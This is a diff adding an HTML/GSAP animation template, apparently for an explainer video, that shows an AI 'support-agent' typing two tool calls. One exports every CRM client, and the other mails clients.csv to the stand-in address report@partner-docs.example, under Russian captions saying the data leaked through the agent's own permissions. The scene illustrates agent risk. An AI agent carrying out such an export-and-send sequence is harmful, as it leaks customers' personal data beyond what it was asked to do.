@@ -1,0 +1,193 @@
+<template>
+  <style>
+    @font-face { font-family: "Beer Money"; src: url("assets/fonts/beermoney.ttf") format("truetype"); }
+    @font-face { font-family: "Gunny Rewritten"; src: url("assets/fonts/gunny.ttf") format("truetype"); }
+    @font-face { font-family: "Veylo Mono"; font-weight: 400; src: url("assets/fonts/jetbrains-mono-cyrillic-400-normal.woff2") format("woff2"); unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116; }
+    @font-face { font-family: "Veylo Mono"; font-weight: 400; src: url("assets/fonts/jetbrains-mono-latin-400-normal.woff2") format("woff2"); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2122, U+2191-2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+    @font-face { font-family: "Veylo Mono"; font-weight: 700; src: url("assets/fonts/jetbrains-mono-cyrillic-700-normal.woff2") format("woff2"); unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116; }
+    @font-face { font-family: "Veylo Mono"; font-weight: 700; src: url("assets/fonts/jetbrains-mono-latin-700-normal.woff2") format("woff2"); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2122, U+2191-2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+    @font-face { font-family: "Veylo Sans"; font-weight: 400; src: url("assets/fonts/inter-cyrillic-400-normal.woff2") format("woff2"); unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116; }
+    @font-face { font-family: "Veylo Sans"; font-weight: 400; src: url("assets/fonts/inter-latin-400-normal.woff2") format("woff2"); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2122, U+2191-2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+    @font-face { font-family: "Veylo Sans"; font-weight: 600; src: url("assets/fonts/inter-cyrillic-600-normal.woff2") format("woff2"); unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116; }
+    @font-face { font-family: "Veylo Sans"; font-weight: 600; src: url("assets/fonts/inter-latin-600-normal.woff2") format("woff2"); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2122, U+2191-2193, U+2212, U+2215, U+FEFF, U+FFFD; }
+    #root {
+      position: absolute;
+      inset: 0;
+      overflow: hidden;
+      color: #f4eee8;
+      font-family: "Veylo Mono", monospace;
+    }
+    .agent-tile {
+      position: absolute;
+      width: 200px;
+      height: 200px;
+      border-radius: 36px;
+      background: linear-gradient(160deg, #d8322b, #8e1010);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .agent-tile svg {
+      width: 112px;
+      height: 112px;
+    }
+    .agent-name {
+      position: absolute;
+      font-size: 30px;
+      color: #ee8a74;
+      white-space: nowrap;
+    }
+    #leak-agent {
+      left: 128px;
+      top: 250px;
+    }
+    #leak-agent-name {
+      left: 104px;
+      top: 474px;
+    }
+    #leak-panel {
+      position: absolute;
+      left: 440px;
+      top: 230px;
+      width: 1360px;
+      font-size: 36px;
+      line-height: 1.5;
+    }
+    .cmd {
+      margin-bottom: 34px;
+    }
+    .cmd .t {
+      color: #8f7774;
+      margin-right: 22px;
+    }
+    .cmd .fn {
+      color: #f4eee8;
+    }
+    .cmd .res {
+      display: block;
+      color: #ee8a74;
+      padding-left: 186px;
+      font-size: 32px;
+    }
+    #leak-file {
+      position: absolute;
+      left: 1440px;
+      top: 92px;
+      width: 300px;
+      height: 120px;
+      border-radius: 16px;
+      background: #f4eee8;
+      color: #1d1a1a;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      padding: 0 26px;
+      font-size: 30px;
+      font-weight: 700;
+    }
+    #leak-file i {
+      width: 56px;
+      height: 70px;
+      border-radius: 6px;
+      background: #2f7d4f;
+      display: block;
+      flex: none;
+    }
+    #leak-title {
+      position: absolute;
+      left: 440px;
+      top: 600px;
+      font-family: "Beer Money", cursive;
+      font-size: 210px;
+      line-height: 1;
+      color: #f4eee8;
+      white-space: nowrap;
+    }
+    #leak-title .w {
+      display: inline-block;
+      margin-right: 0.22em;
+    }
+    #leak-cap {
+      position: absolute;
+      left: 448px;
+      top: 850px;
+      font-family: "Gunny Rewritten", cursive;
+      font-size: 64px;
+      color: #ee8a74;
+      white-space: nowrap;
+    }
+    #leak-cap .w {
+      display: inline-block;
+      margin-right: 0.28em;
+    }
+    #leak-dark {
+      position: absolute;
+      inset: 0;
+      background: #140809;
+    }
+  </style>
+  <div id="root" data-composition-id="leak" data-width="1920" data-height="1080">
+    <div id="leak-agent" class="agent-tile">
+      <svg viewBox="0 0 48 48" fill="none" stroke="#f4eee8" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="9" y="15" width="30" height="24" rx="6" /><path d="M24 15V8" /><circle cx="24" cy="7" r="2.2" />
+        <circle cx="18" cy="27" r="2.4" fill="#f4eee8" /><circle cx="30" cy="27" r="2.4" fill="#f4eee8" /><path d="M5 25v6M43 25v6" />
+      </svg>
+    </div>
+    <div id="leak-agent-name" class="agent-name">support-agent</div>
+    <div id="leak-panel">
+      <div class="cmd" id="leak-c1">
+        <span class="t">14:02:15</span><span class="fn type">crm.export_clients(filter="все")</span>
+        <span class="res" id="leak-r1">200 OK · clients.csv</span>
+      </div>
+      <div class="cmd" id="leak-c2">
+        <span class="t">14:02:17</span><span class="fn type">mail.send(to="report@partner-docs.example",</span><br />
+        <span class="t" style="visibility: hidden">14:02:17</span><span class="fn type">attach="clients.csv")</span>
+        <span class="res" id="leak-r2">отправлено</span>
+      </div>
+    </div>
+    <div id="leak-file"><i></i>clients.csv</div>
+    <div id="leak-title" class="clip" data-start="4.8" data-duration="3.7">
+      <span class="w">ДАННЫЕ</span><span class="w">УТЕКЛИ</span>
+    </div>
+    <div id="leak-cap" class="clip" data-start="5.8" data-duration="2.7">
+      <span class="w">Агент</span><span class="w">сделал</span><span class="w">это</span><span class="w">своими</span><span class="w">правами</span>
+    </div>
+    <div id="leak-dark"></div>
+  </div>
+  <script>
+    (function () {
+      // печать по символам: оборачиваем текст строк в span
+      document.querySelectorAll("#leak-panel .type").forEach((el) => {
+        const txt = el.textContent;
+        el.textContent = "";
+        for (const ch of txt) {
+          const s = document.createElement("span");
+          s.className = "ch";
+          s.textContent = ch;
+          el.appendChild(s);
+        }
+      });
+      const tl = gsap.timeline({ paused: true });
+      tl.fromTo("#leak-dark", { opacity: 1 }, { opacity: 0, duration: 0.45, ease: "power2.out" }, 0);
+      tl.fromTo("#leak-agent", { scale: 0.6, opacity: 0 }, { scale: 1, opacity: 1, duration: 0.6, ease: "expo.out" }, 0.15);
+      tl.fromTo("#leak-agent-name", { opacity: 0 }, { opacity: 1, duration: 0.3 }, 0.35);
+      tl.fromTo("#leak-panel .t", { opacity: 0 }, { opacity: 1, duration: 0.2 }, 0.5);
+
+      const c1 = gsap.utils.toArray("#leak-c1 .ch");
+      const c2 = gsap.utils.toArray("#leak-c2 .ch");
+      tl.fromTo(c1, { opacity: 0 }, { opacity: 1, duration: 0.01, stagger: 1.2 / c1.length }, 0.7);
+      tl.fromTo("#leak-r1", { opacity: 0, filter: "blur(6px)" }, { opacity: 1, filter: "blur(0px)", duration: 0.2 }, 2.0);
+      tl.fromTo("#leak-file", { scale: 0.4, opacity: 0, x: 0 }, { scale: 1, opacity: 1, duration: 0.5, ease: "expo.out" }, 2.1);
+      tl.fromTo(c2, { opacity: 0 }, { opacity: 1, duration: 0.01, stagger: 1.5 / c2.length }, 2.5);
+      tl.fromTo("#leak-r2", { opacity: 0, filter: "blur(6px)" }, { opacity: 1, filter: "blur(0px)", duration: 0.2 }, 4.0);
+      // файл улетает за пределы кадра
+      tl.to("#leak-file", { x: 900, rotation: 8, filter: "blur(6px)", duration: 0.5, ease: "power3.in" }, 4.1);
+
+      tl.fromTo("#leak-title .w", { opacity: 0, filter: "blur(10px)" },
+        { opacity: 1, filter: "blur(0px)", duration: 0.16, stagger: 0.09, ease: "power2.out" }, 4.85);
+      tl.fromTo("#leak-cap .w", { opacity: 0, filter: "blur(6px)" },
+        { opacity: 1, filter: "blur(0px)", duration: 0.15, stagger: 0.07, ease: "power2.out" }, 5.85);
+      window.__timelines["leak"] = tl;
+    })();
+  </script>
+</template>
